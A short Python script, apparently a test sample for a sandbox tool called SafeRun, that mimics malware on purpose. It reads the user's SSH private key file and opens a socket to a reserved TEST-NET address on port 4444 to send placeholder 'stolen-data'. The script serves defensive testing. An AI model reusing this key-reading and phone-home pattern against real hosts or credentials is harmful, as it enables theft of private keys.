# A HARMLESS demo that *looks* sketchy — used to prove SafeRun catches the kinds
# of things real malware does: reading private keys and phoning home.
#
# It does not actually exfiltrate anything: the file read is best-effort and the
# network connection goes to a non-routable address and is caught by SafeRun.

import os
import socket

print("hello from the sample script")

# 1) Try to read a sensitive file (what a credential stealer would do).
try:
    with open(os.path.expanduser("~/.ssh/id_rsa"), "r") as f:
        secret = f.read()
    print("read a key of length", len(secret))
except OSError:
    print("no key file found (that's fine for the demo)")

# 2) Try to "phone home" (what exfiltration looks like).
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(0.5)
    s.connect(("203.0.113.10", 4444))  # reserved TEST-NET address; goes nowhere
    s.sendall(b"stolen-data")
    s.close()
except OSError:
    print("could not connect (expected in the demo)")

print("done")
